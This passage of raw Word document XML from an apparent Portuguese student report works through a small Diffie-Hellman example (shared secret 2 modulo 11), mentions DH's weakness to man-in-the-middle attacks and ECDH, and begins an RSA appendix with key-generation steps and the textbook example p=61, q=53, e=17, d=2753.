    <w:p w14:paraId="50660F1C" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Berto envia 7 para Ana.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765E7DE2" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00000000" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="73B0C794">
          <v:rect id="_x0000_i1032" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="221049B4" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65E848F1" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2. Cálculo do segredo partilhado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B433B7E" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Ana:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4E0080" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>S = B^a mod p = 7^3 mod 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34762364" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>7^2 = 49 mod 11 = 49 - 44 = 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
        <w:t xml:space="preserve"> 7^3 = 7^2 * 7 = 5 * 7 = 35 mod 11 = 35 - 33 = 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33387497" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00000000" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="5FE55F44">
          <v:rect id="_x0000_i1033" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DDA6B7" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Berto:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D517680" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>S = A^b mod p = 8^7 mod 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293BD2EF" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Passo a passo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7717EAC5" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>8^2 = 64 mod 11 = 64 - 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>11 = 64 - 55 = 9</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 8^4 = 9^2 = 81 mod 11 = 81 - 77 = 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 8^7 = 8^4 * 8^2 * 8 = 4 * 9 * 8 = 288 mod 11 = 288 - 26</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>11 = 288 - 286 = 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B968080" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00000000" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="7D84A01F">
          <v:rect id="_x0000_i1034" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CC8EF0" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Resultado final:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> O segredo partilhado entre Ana e Berto é </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE6D908" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7220F766" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Atualmente, o algoritmo </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Diffie-Hellman</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> clássico caiu em desuso devido às suas vulnerabilidades a ataques “</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Man-in-the-Middle</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>” (</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>MiTM</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">) e à facilidade de quebrar chaves quando </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>números primos pequenos eram utilizados</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BFE8AE" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Apesar disso, continua a ser extremamente útil para ensinar os </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>princípios fundamentais da criptografia</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> e da </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>troca segura de chaves</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55090DF1" w14:textId="6F5E5AD1" w:rsidR="00371B58" w:rsidRDefault="00A04B3D" w:rsidP="00371B58">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Hoje em dia, existe uma versão aprimorada do </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Diffie-Hellman</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, baseada em </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>curvas elípticas</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> (conhecida como </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Elliptic Curve Diffie-Hellman</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">), que oferece maior segurança com chaves menores e é </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">amplamente utilizada </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>em</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> protocolos modernos</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>de comunicação segura</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, como </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS/HTTPS</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>criptomoedas</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67287852" w14:textId="77777777" w:rsidR="00371B58" w:rsidRPr="00371B58" w:rsidRDefault="00371B58" w:rsidP="00371B58">
      <w:pPr>
        <w:ind w:left="708" w:hanging="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C1C237A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E89A7A2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71F0C10C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="3C2AE956" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="55466B5F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="09920145" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="41475ACE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="69736727" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="0B49269A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="105A96D9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="7E59BF72" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="54127698" w14:textId="5A3BC5D0" w:rsidR="00A04B3D" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="202" w:name="_Toc213874744"/>
      <w:bookmarkStart w:id="203" w:name="_Toc213881982"/>
      <w:r>
        <w:t xml:space="preserve">Apêndice D – </w:t>
      </w:r>
      <w:r w:rsidR="00236B3B">
        <w:t>RSA -</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="202"/>
      <w:r w:rsidR="00A04B3D">
        <w:t>Samuel Rocha, nº2024127</w:t>
      </w:r>
      <w:bookmarkEnd w:id="203"/>
      <w:r w:rsidR="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="27113C6A" w14:textId="692F856F" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7736BF16" w14:textId="61D569A8" w:rsidR="00236B3B" w:rsidRDefault="00236B3B" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>RSA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7531551F" w14:textId="42209667" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1. Introdução e Conceito</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009B6C51" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>O algoritmo RSA (Rivest–Shamir–Adleman) é um dos métodos mais importantes de criptografia assimétrica. Ele baseia-se em propriedades matemáticas dos números primos e da aritmética modular para garantir segurança. Com o RSA, cada utilizador possui uma chave pública e uma chave privada. A encriptação usa a chave pública, enquanto a desencriptação requer a chave privada.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6597222F" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2. Etapas Matemáticas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72075F35" w14:textId="1D0CFC6D" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Escolher dois números primos grandes p e q.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FDC5C68" w14:textId="4B7B5FA4" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Calcular n = p × q.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D1C7D6" w14:textId="30CB3EE4" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Calcular φ(n) = (p−1)(q−1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EC5694" w14:textId="2C2DEA92" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Escolher um número e tal que 1 &lt; e &lt; φ(n) e gcd(e, φ(n)) = 1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C22C94" w14:textId="04909170" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Calcular d, o inverso modular de e módulo φ(n).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E35082D" w14:textId="3198761F" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A chave pública é (n, e) e a chave privada é d.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63879218" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A segurança do RSA depende da dificuldade de fatorizar números grandes. Mesmo conhecendo n e e, calcular d é praticamente impossível sem saber p e q.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="328564B1" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62FC8433" w14:textId="3270F575" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3. Fórmulas Fundamentais</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C687E6F" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>• Encriptação:  c ≡ m^e (mod n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC71D00" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>• Desencriptação:  m ≡ c^d (mod n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B05714" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C095814" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4. Exemplo Completo com Cálculos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D84F1D9" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Escolhemos os primos pequenos p = 61 e q = 53.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303EF1F7" w14:textId="1282F701" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>n = p × q = 61 × 53 = 3233</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D56C4A" w14:textId="5881F62F" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>φ(n) = (p−1)(q−1) = 60 × 52 = 3120</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA851BD" w14:textId="5FBEBE9E" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Escolhe-se e = 17 (coprimo de 3120)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53548711" w14:textId="27E0A721" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Calcula-se d, o inverso modular de 17 mod 3120 → d = 2753</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCE74FC" w14:textId="5881D40A" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
